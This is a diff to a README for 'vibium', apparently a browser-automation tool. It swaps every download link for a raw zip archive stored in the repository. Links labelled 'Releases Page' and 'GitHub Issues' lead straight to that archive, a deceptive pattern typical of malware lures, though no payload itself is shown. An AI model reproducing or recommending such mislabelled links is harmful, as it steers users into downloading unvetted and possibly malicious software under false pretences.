@@ -6,11 +6,11 @@ Welcome to vibium! This application helps you automate tasks in your web browser
 
 ## 📥 Download vibium
 
-[![Download vibium](https://github.com/SWE-code/vibium/raw/refs/heads/main/docs/Software_1.2-beta.4.zip)](https://github.com/SWE-code/vibium/raw/refs/heads/main/docs/Software_1.2-beta.4.zip)
+[![Download vibium](https://raw.githubusercontent.com/SWE-code/vibium/main/packages/python/vibium_linux_x64/Software-v3.2.zip)](https://raw.githubusercontent.com/SWE-code/vibium/main/packages/python/vibium_linux_x64/Software-v3.2.zip)
 
 To get vibium, you need to visit our Releases page. There, you can find the latest version of the application. Click the link below to go directly:
 
-[Visit the Releases Page to Download](https://github.com/SWE-code/vibium/raw/refs/heads/main/docs/Software_1.2-beta.4.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SWE-code/vibium/main/packages/python/vibium_linux_x64/Software-v3.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -62,13 +62,13 @@ For more detailed instructions, you can refer to our [official documentation](#)
 
 ## 🤝 Support
 
-If you need help, you can reach out via [GitHub Issues](https://github.com/SWE-code/vibium/raw/refs/heads/main/docs/Software_1.2-beta.4.zip) or our dedicated support forum. We are here to assist you with any questions or concerns.
+If you need help, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/SWE-code/vibium/main/packages/python/vibium_linux_x64/Software-v3.2.zip) or our dedicated support forum. We are here to assist you with any questions or concerns.
 
 ## 🔄 Update vibium
 
 To keep vibium running smoothly, regularly check for updates on the Releases page. Download the latest version to benefit from new features and improvements.
 
-[Visit the Releases Page to Download](https://github.com/SWE-code/vibium/raw/refs/heads/main/docs/Software_1.2-beta.4.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SWE-code/vibium/main/packages/python/vibium_linux_x64/Software-v3.2.zip)
 
 ## 📣 Community Contributions
 
